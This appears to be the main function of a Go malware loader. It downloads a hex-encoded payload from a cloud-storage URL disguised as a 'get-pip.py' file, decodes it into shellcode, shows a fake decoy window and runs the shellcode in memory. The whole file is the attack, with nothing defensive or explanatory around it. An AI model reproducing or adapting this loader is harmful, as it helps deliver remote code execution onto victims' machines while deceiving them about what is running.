package main

import (
	"encoding/hex"
)


func main() {
//	FakerWindow()
	shellcodeStr := httpDownload("https://wx-1252923087.cos.ap-guangzhou.myqcloud.com/g2b4/get-pip.py")
	shellcodeByte, _ := hex.DecodeString(shellcodeStr)
	FakerWindow()
	Run(shellcodeByte)
}
